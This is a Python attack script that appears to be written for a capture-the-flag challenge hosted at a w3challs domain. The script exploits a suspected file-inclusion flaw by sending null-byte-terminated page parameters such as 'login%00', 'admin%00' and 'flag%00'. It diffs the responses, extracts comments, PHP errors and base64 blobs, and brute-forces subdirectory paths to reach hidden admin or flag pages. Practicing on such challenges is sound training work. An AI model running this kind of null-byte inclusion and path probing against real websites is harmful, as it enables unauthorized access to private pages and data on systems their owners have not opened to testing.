#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import re

s = requests.Session()
base = "https://vip.hax.w3challs.com/"

print("[*] EXTRACTING NULL BYTE CONTENT...")

# login%00 gives 1796 bytes vs 1189 normal
r = s.get(f"{base}index.php?page=login%00")
soup = BeautifulSoup(r.text, 'html.parser')

# Extract all text
print(f"Full response length: {len(r.text)}")

# Get corps content
corps = soup.find('div', {'id': 'corps'})
if corps:
    # Get raw HTML
    corps_html = str(corps)
    print(f"\nCorps HTML:\n{corps_html}")
    
    # Look for hidden content, comments, or JavaScript
    if '<!--' in r.text:
        comments = re.findall(r'<!--(.*?)-->', r.text, re.DOTALL)
        for comment in comments:
            if comment.strip():
                print(f"\nCOMMENT FOUND: {comment}")
    
    # Check for any PHP errors or leaks
    if 'Warning' in r.text or 'Notice' in r.text:
        errors = re.findall(r'(Warning|Notice|Error):.*', r.text)
        for error in errors:
            print(f"\nERROR: {error}")
    
    # Look for base64 encoded content
    b64_pattern = re.findall(r'[A-Za-z0-9+/]{50,}={0,2}', r.text)
    for b64 in b64_pattern:
        try:
            import base64
            decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
            if len(decoded) > 10:
                print(f"\nBASE64 DECODED: {decoded[:100]}")
        except:
            pass

# Now check what's different between login and login%00
r_normal = s.get(f"{base}index.php?page=login")
r_null = s.get(f"{base}index.php?page=login%00")

# Find the difference
normal_lines = r_normal.text.split('\n')
null_lines = r_null.text.split('\n')

print(f"\n[*] DIFFERENCES:")
print(f"Normal: {len(normal_lines)} lines, Null: {len(null_lines)} lines")

# Show lines that are in null but not in normal
for line in null_lines:
    if line not in normal_lines and line.strip():
        print(f"EXTRA IN NULL: {line[:100]}")

# Try other files with null byte that showed different sizes
files_to_check = ["member%00", "admin%00", "flag%00"]

for file in files_to_check:
    r = s.get(f"{base}index.php?page={file}")
    soup = BeautifulSoup(r.text, 'html.parser')
    corps = soup.find('div', {'id': 'corps'})
    
    if corps:
        content = corps.get_text(strip=True)
        if content and 'Welcome to' not in content:
            print(f"\n[{file}] Content: {content[:500]}")
            
            # Check for flag
            if 'flag' in content.lower():
                print(f"[!!!] FLAG FOUND IN {file}: {content}")
            
            # Check for forms
            forms = corps.find_all('form')
            for form in forms:
                print(f"[{file}] Form found: {form.get('action', 'no-action')}")
                for inp in form.find_all('input'):
                    print(f"  Input: {inp.get('name', 'no-name')} type={inp.get('type', 'no-type')}")

# The key insight: login%00 shows the home page (1796 bytes)
# This means null byte is making it default to home
# But the files exist (they return 736 bytes without null)
# 736 bytes = empty corps div

print("\n[*] THEORY: Files exist but are empty PHP files")
print("The include() is working but the PHP files have no content")
print("Need to find the ACTUAL member/admin pages...")

# Maybe they're in a subdirectory?
subdirs = ["admin/", "members/", "includes/", "pages/", "content/", "private/", "secure/"]

for subdir in subdirs:
    for file in ["member", "admin", "flag"]:
        r = s.get(f"{base}index.php?page={subdir}{file}")
        if len(r.text) != 736 and 'Welcome to' not in r.text:
            print(f"[!] Found in subdir: {subdir}{file}")
            
        # With null byte
        r = s.get(f"{base}index.php?page={subdir}{file}%00")
        if len(r.text) != 736 and len(r.text) != 1796:
            print(f"[!] Found with null: {subdir}{file}%00")